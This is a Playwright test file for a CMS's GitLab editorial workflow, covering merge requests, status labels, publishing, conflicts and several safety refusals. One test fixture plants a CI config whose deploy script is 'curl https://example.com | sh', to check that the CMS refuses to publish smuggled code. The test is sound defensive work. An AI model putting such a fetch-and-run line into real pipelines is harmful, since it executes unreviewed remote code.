import { post } from '../../fixtures/configs/workflow.js';
import { expect, GITLAB_CONFIG, test } from '../../fixtures/test.js';

/**
 * @import { Locator, Page } from '@playwright/test';
 * @import { CMS } from '../../fixtures/test.js';
 * @import { MockGitLab, MockMergeRequest } from '../../fixtures/gitlab.js';
 */

/**
 * The GitLab blog with Editorial Workflow: saving an entry commits it to a branch of its own and
 * opens a merge request, which is merged when the entry is published.
 */
const GITLAB_WORKFLOW_CONFIG = { ...GITLAB_CONFIG, publish_mode: 'editorial_workflow' };

test.use({ config: GITLAB_WORKFLOW_CONFIG });

test.beforeEach(async ({ gitlab }) => {
  gitlab.commit({ 'content/posts/first-post.md': post('First Post', 'Hello, world!') });
});

/**
 * Open a merge request for a post the way the CMS does: on a `cms/posts/{slug}` branch, with a
 * status label, and a `Draft: ` title prefix while the entry is a draft.
 * @param {MockGitLab} gitlab GitLab mock.
 * @param {object} args Arguments.
 * @param {string} args.slug Entry slug.
 * @param {Record<string, string | null>} args.files Files to commit to the branch.
 * @param {string} [args.status] Workflow status.
 * @returns {MockMergeRequest} Merge request.
 */
const openEntryMergeRequest = (gitlab, { slug, files, status = 'draft' }) => {
  const branch = `cms/posts/${slug}`;
  const title = `Update Post “${slug}”`;

  gitlab.createBranch(branch, gitlab.head.oid);
  gitlab.commit(files, { branch, author: gitlab.user, message: title });

  return gitlab.openMergeRequest({
    title: status === 'draft' ? `Draft: ${title}` : title,
    sourceBranch: branch,
    labels: [`sveltia-cms/${status}`],
    author: gitlab.user,
  });
};

/**
 * Open an entry in the editor.
 * @param {Page} page Page.
 * @param {string} title Entry title.
 * @returns {Promise<Locator>} Editor.
 */
const openEntry = async (page, title) => {
  const editor = page.getByRole('group', { name: 'Content Editor' });

  await page.getByRole('row', { name: new RegExp(title) }).click();
  await expect(editor.getByRole('textbox', { name: 'Title' })).toHaveValue(title);

  return editor;
};

/**
 * Save the entry, and keep it a draft rather than sending it for review.
 * @param {Page} page Page.
 * @param {Locator} editor Editor.
 */
const saveDraft = async (page, editor) => {
  await editor.getByRole('button', { name: 'Save' }).click();
  await page
    .getByRole('alertdialog', { name: 'Send for Review' })
    .getByRole('button', { name: 'Later' })
    .click();
};

/**
 * Publish the entry open in the editor.
 * @param {Page} page Page.
 * @param {Locator} editor Editor.
 */
const publish = async (page, editor) => {
  await editor.getByRole('button', { name: 'Publish Entry' }).click();
  await page
    .getByRole('alertdialog', { name: 'Publish Entry' })
    .getByRole('button', { name: 'Publish' })
    .click();
};

/**
 * Change the status of the entry open in the editor with its status menu.
 * @param {CMS} cms CMS.
 * @param {Page} page Page.
 * @param {RegExp} current Current status.
 * @param {string} status New status.
 */
const changeStatus = async (cms, page, current, status) => {
  await cms.chooseMenuItem(
    page.getByRole('button', { name: current }),
    page.getByRole('menuitemradio', { name: status }),
  );
};

test('saves a new entry to a branch and opens a draft merge request', async ({
  cms,
  gitlab,
  page,
}) => {
  const { oid: mainBefore } = gitlab.head;

  await cms.open();
  await page.getByRole('button', { name: 'Create New Entry' }).first().click();

  const editor = page.getByRole('group', { name: 'Content Editor' });

  await editor.getByRole('textbox', { name: 'Title' }).fill('Second Post');
  await editor.getByRole('textbox', { name: 'Body' }).fill('Coming soon.');
  await saveDraft(page, editor);

  await expect
    .poll(() => gitlab.mergeRequests)
    .toMatchObject([
      {
        title: 'Draft: Create Post “second-post”',
        sourceBranch: 'cms/posts/second-post',
        targetBranch: 'main',
        state: 'opened',
        labels: ['sveltia-cms/draft'],
      },
    ]);
  // The commit creates the branch from the configured one
  expect(gitlab.received[0]).toMatchObject({
    branch: 'cms/posts/second-post',
    start_branch: 'main',
  });
  expect(gitlab.readFile('content/posts/second-post.md', 'cms/posts/second-post')).toBe(
    post('Second Post', 'Coming soon.'),
  );
  // Nothing is published yet
  expect(gitlab.head.oid).toBe(mainBefore);
  await expect(page.getByRole('grid', { name: 'Entries' }).getByRole('row')).toContainText([
    /Second Post.*Draft/,
  ]);
});

test('saves changes to a published entry to one merge request', async ({ cms, gitlab, page }) => {
  await cms.open();

  const editor = await openEntry(page, 'First Post');

  await editor.getByRole('textbox', { name: 'Body' }).fill('Hello again!');
  await saveDraft(page, editor);
  await expect
    .poll(() => gitlab.readFile('content/posts/first-post.md', 'cms/posts/first-post'))
    .toBe(post('First Post', 'Hello again!'));

  // Another save goes to the same branch and merge request
  await openEntry(page, 'First Post');
  await editor.getByRole('textbox', { name: 'Body' }).fill('Hello once more!');
  await saveDraft(page, editor);

  await expect
    .poll(() => gitlab.readFile('content/posts/first-post.md', 'cms/posts/first-post'))
    .toBe(post('First Post', 'Hello once more!'));
  expect(gitlab.received[1]).not.toHaveProperty('start_branch');
  expect(gitlab.mergeRequests).toHaveLength(1);
  // Still published as it was
  expect(gitlab.readFile('content/posts/first-post.md')).toBe(post('First Post', 'Hello, world!'));
});

test('moves an entry through the review stages', async ({ cms, gitlab, page }) => {
  const mergeRequest = openEntryMergeRequest(gitlab, {
    slug: 'second-post',
    files: { 'content/posts/second-post.md': post('Second Post', 'Coming soon.') },
  });

  await cms.open();
  await openEntry(page, 'Second Post');

  // A draft is marked in the title, which the CMS strips when it reads it
  await changeStatus(cms, page, /Status: .*Draft/, 'In Review');
  await expect
    .poll(() => ({ labels: mergeRequest.labels, title: mergeRequest.title }))
    .toEqual({ labels: ['sveltia-cms/pending_review'], title: 'Update Post “second-post”' });

  await changeStatus(cms, page, /Status: .*In Review/, 'Ready');
  await expect.poll(() => mergeRequest.labels).toEqual(['sveltia-cms/pending_publish']);

  await changeStatus(cms, page, /Status: .*Ready/, 'Draft');
  await expect
    .poll(() => ({ labels: mergeRequest.labels, title: mergeRequest.title }))
    .toEqual({ labels: ['sveltia-cms/draft'], title: 'Draft: Update Post “second-post”' });
});

test('keeps the other labels of a merge request', async ({ cms, gitlab, page }) => {
  const mergeRequest = openEntryMergeRequest(gitlab, {
    slug: 'second-post',
    files: { 'content/posts/second-post.md': post('Second Post', 'Coming soon.') },
  });

  mergeRequest.labels.push('documentation');

  await cms.open();
  await openEntry(page, 'Second Post');
  await changeStatus(cms, page, /Status: .*Draft/, 'Ready');

  await expect
    .poll(() => mergeRequest.labels)
    .toEqual(['documentation', 'sveltia-cms/pending_publish']);
});

test('publishes an entry by merging its merge request', async ({ cms, gitlab, page }) => {
  const mergeRequest = openEntryMergeRequest(gitlab, {
    slug: 'second-post',
    files: { 'content/posts/second-post.md': post('Second Post', 'Coming soon.') },
    status: 'pending_publish',
  });

  await cms.open();
  await publish(page, await openEntry(page, 'Second Post'));

  await expect.poll(() => mergeRequest.state).toBe('merged');
  expect(gitlab.readFile('content/posts/second-post.md')).toBe(post('Second Post', 'Coming soon.'));
  expect(gitlab.head).toMatchObject({ message: 'Update Post “second-post”' });
  expect(gitlab.head.parents).toHaveLength(2);
  // The branch is deleted along with the merge
  expect(gitlab.refs.has('cms/posts/second-post')).toBe(false);
  await expect(page.getByRole('grid', { name: 'Entries' }).getByRole('row')).toHaveText([
    /First Post/,
    /Second Post/,
  ]);
});

test.describe('with `squash_merges`', () => {
  test.use({
    config: {
      ...GITLAB_WORKFLOW_CONFIG,
      backend: { ...GITLAB_WORKFLOW_CONFIG.backend, squash_merges: true },
    },
  });

  test('squashes the merge request into a single commit', async ({ cms, gitlab, page }) => {
    const mergeRequest = openEntryMergeRequest(gitlab, {
      slug: 'second-post',
      files: { 'content/posts/second-post.md': post('Second Post', 'Coming soon.') },
      status: 'pending_publish',
    });

    const { oid: mainBefore } = gitlab.head;

    await cms.open();
    await publish(page, await openEntry(page, 'Second Post'));

    await expect.poll(() => mergeRequest.state).toBe('merged');
    expect(gitlab.head).toMatchObject({
      parents: [mainBefore],
      message: 'Update Post “second-post”',
    });
  });
});

test('refuses to publish an entry whose merge request has a conflict', async ({
  cms,
  gitlab,
  page,
}) => {
  const mergeRequest = openEntryMergeRequest(gitlab, {
    slug: 'first-post',
    files: { 'content/posts/first-post.md': post('First Post', 'Hello from Mona!') },
    status: 'pending_publish',
  });

  // A colleague changes the same file on the configured branch in the meantime
  gitlab.commit({ 'content/posts/first-post.md': post('First Post', 'Hello from Alex!') });
  await cms.open();
  await publish(page, await openEntry(page, 'First Post'));

  // GitLab refuses the merge, and its detailed merge status tells a conflict from a pipeline still
  // running, which would be merged automatically once it passes
  await expect(page.getByRole('alert')).toContainText('Couldn’t publish the entry.');
  expect(mergeRequest.state).toBe('opened');
  expect(gitlab.readFile('content/posts/first-post.md')).toBe(
    post('First Post', 'Hello from Alex!'),
  );
  expect(gitlab.refs.has('cms/posts/first-post')).toBe(true);
  await expect(page.getByRole('button', { name: 'Publish Entry' })).toBeEnabled();
});

test('publishes an entry once the pipeline of its merge request succeeds', async ({
  cms,
  gitlab,
  page,
}) => {
  const mergeRequest = openEntryMergeRequest(gitlab, {
    slug: 'second-post',
    files: { 'content/posts/second-post.md': post('Second Post', 'Coming soon.') },
    status: 'pending_publish',
  });

  gitlab.pipelineRunning = true;
  await page.clock.install();
  await cms.open();
  await publish(page, await openEntry(page, 'Second Post'));

  // GitLab can’t merge it yet, so the CMS sets it to be merged when the pipeline succeeds
  await expect.poll(() => mergeRequest.autoMerge).toMatchObject({ auto_merge: true });
  expect(mergeRequest.state).toBe('opened');

  // The CMS checks every 10 seconds whether it has been merged
  gitlab.finishPipeline();
  await page.clock.fastForward('00:11');

  await expect(page.getByRole('grid', { name: 'Entries' }).getByRole('row')).toHaveText([
    /First Post/,
    /Second Post/,
  ]);
  expect(mergeRequest.state).toBe('merged');
  expect(gitlab.readFile('content/posts/second-post.md')).toBe(post('Second Post', 'Coming soon.'));
  // GitLab removed the branch along with the merge
  expect(gitlab.refs.has('cms/posts/second-post')).toBe(false);
});

test('deletes an unpublished entry by closing its merge request', async ({ cms, gitlab, page }) => {
  const { oid: mainBefore } = gitlab.head;

  const mergeRequest = openEntryMergeRequest(gitlab, {
    slug: 'second-post',
    files: { 'content/posts/second-post.md': post('Second Post', 'Coming soon.') },
  });

  await cms.open();
  await openEntry(page, 'Second Post');
  await cms.chooseMenuItem(
    page.getByRole('button', { name: 'Show Editor Options' }),
    page.getByRole('menuitem', { name: 'Delete Entry' }),
  );
  await page
    .getByRole('alertdialog', { name: 'Delete Entry' })
    .getByRole('button', { name: 'Delete' })
    .click();

  await expect.poll(() => mergeRequest.state).toBe('closed');
  await expect.poll(() => gitlab.refs.has('cms/posts/second-post')).toBe(false);
  expect(gitlab.head.oid).toBe(mainBefore);
});

test('starts over from a branch left over from an earlier merge request', async ({
  cms,
  gitlab,
  page,
}) => {
  // A branch with no open merge request, e.g. one a closed merge request has left behind
  gitlab.createBranch('cms/posts/first-post', gitlab.head.oid);
  gitlab.commit(
    { 'content/posts/first-post.md': post('First Post', 'Stale draft.') },
    { branch: 'cms/posts/first-post' },
  );

  await cms.open();

  const editor = await openEntry(page, 'First Post');

  await editor.getByRole('textbox', { name: 'Body' }).fill('Fresh draft.');
  await saveDraft(page, editor);

  // GitLab refuses to create the branch again, so the CMS deletes it and starts over
  await expect
    .poll(() => gitlab.mergeRequests.map(({ sourceBranch, state }) => ({ sourceBranch, state })))
    .toEqual([{ sourceBranch: 'cms/posts/first-post', state: 'opened' }]);
  expect(gitlab.readFile('content/posts/first-post.md', 'cms/posts/first-post')).toBe(
    post('First Post', 'Fresh draft.'),
  );
  // The new branch starts from the configured one, without the stale commit
  expect(gitlab.getHead('cms/posts/first-post').parents).toEqual([gitlab.head.oid]);
});

test('drops a labelled merge request moved to another target branch from the board', async ({
  cms,
  gitlab,
  page,
}) => {
  // A merge request the CMS opened and labelled, whose target branch a maintainer then changed on
  // GitLab. It goes somewhere the CMS doesn’t manage, so publishing the entry from the board would
  // merge it into that branch instead
  const moved = openEntryMergeRequest(gitlab, {
    slug: 'second-post',
    files: { 'content/posts/second-post.md': post('Second Post', 'Coming soon.') },
  });

  gitlab.createBranch('develop', gitlab.head.oid);
  moved.targetBranch = 'develop';

  await cms.open();

  // The entry isn’t listed as unpublished, and the board has nothing on it
  await expect(page.getByRole('grid', { name: 'Entries' }).getByRole('row')).toHaveText([
    /First Post/,
  ]);
  await page.getByRole('radio', { name: 'Editorial Workflow' }).click();

  const board = page.getByRole('group', { name: 'Editorial Workflow' });

  // Wait for the board itself, or an empty column would read as one that hasn’t rendered yet
  await expect(board.getByRole('list', { name: 'Drafts' })).toBeVisible();
  await expect(board.getByRole('listitem')).toHaveCount(0);
  // Its label is left as it stands, rather than moved as the entry changes status
  expect(moved).toMatchObject({
    targetBranch: 'develop',
    state: 'opened',
    labels: ['sveltia-cms/draft'],
  });
});

test('refuses to save onto a workflow branch with a merge request to another branch', async ({
  cms,
  gitlab,
  page,
}) => {
  // A workflow branch someone else is working on
  gitlab.createBranch('cms/posts/first-post', gitlab.head.oid);
  gitlab.commit(
    { 'content/posts/draft-notes.md': post('Draft Notes', 'Someone else’s work.') },
    { branch: 'cms/posts/first-post' },
  );
  gitlab.createBranch('develop', gitlab.head.oid);

  // A merge request they opened from that branch to a branch the CMS doesn’t manage. It isn’t the
  // entry’s, so the CMS must neither act on it, delete the branch it’s built on, which GitLab would
  // close it along with, nor commit onto it: their work would then go out with the entry
  const decoy = gitlab.openMergeRequest({
    title: 'Tidy up the posts',
    sourceBranch: 'cms/posts/first-post',
    targetBranch: 'develop',
  });

  const branchHead = gitlab.refs.get('cms/posts/first-post');

  await cms.open();

  const editor = await openEntry(page, 'First Post');

  await editor.getByRole('textbox', { name: 'Body' }).fill('Fresh draft.');
  await editor.getByRole('button', { name: 'Save' }).click();

  await expect(page.getByRole('alertdialog', { name: 'Error' })).toContainText(
    'Another request (\u2068!1\u2069) is already open for this entry outside the CMS.',
  );
  expect(gitlab.mergeRequests).toHaveLength(1);
  expect(decoy).toMatchObject({
    title: 'Tidy up the posts',
    targetBranch: 'develop',
    state: 'opened',
    labels: [],
  });
  expect(gitlab.refs.get('cms/posts/first-post')).toBe(branchHead);
});

test('refuses to publish an entry whose merge request changes other files', async ({
  cms,
  gitlab,
  page,
}) => {
  // A developer can push a branch but not merge into the configured branch, which is GitLab’s
  // default. A change to the site’s code slipped into what looks like an ordinary entry on the
  // board would otherwise go live when a maintainer publishes it
  const mergeRequest = openEntryMergeRequest(gitlab, {
    slug: 'second-post',
    files: {
      'content/posts/second-post.md': post('Second Post', 'Coming soon.'),
      '.gitlab-ci.yml': 'deploy:\n  script: curl https://example.com | sh\n',
    },
    status: 'pending_publish',
  });

  await cms.open();
  await publish(page, await openEntry(page, 'Second Post'));

  await expect(page.getByRole('alert')).toContainText(
    'This entry can’t be published here, because it comes with other changes the CMS can’t show you.',
  );
  expect(mergeRequest.state).toBe('opened');
  expect(gitlab.readFile('.gitlab-ci.yml')).toBeUndefined();
});

test('refuses to publish an entry whose branch has moved on since it was opened', async ({
  cms,
  gitlab,
  page,
}) => {
  const mergeRequest = openEntryMergeRequest(gitlab, {
    slug: 'second-post',
    files: { 'content/posts/second-post.md': post('Second Post', 'Coming soon.') },
    status: 'pending_publish',
  });

  await cms.open();

  const editor = await openEntry(page, 'Second Post');

  // Pushed after the entry has been reviewed, so publishing would merge what nobody has seen
  gitlab.commit(
    { 'content/posts/second-post.md': post('Second Post', 'Something else entirely.') },
    { branch: 'cms/posts/second-post' },
  );
  await publish(page, editor);

  await expect(page.getByRole('alert')).toContainText(
    'The entry has been changed since you opened it.',
  );
  expect(mergeRequest.state).toBe('opened');
});
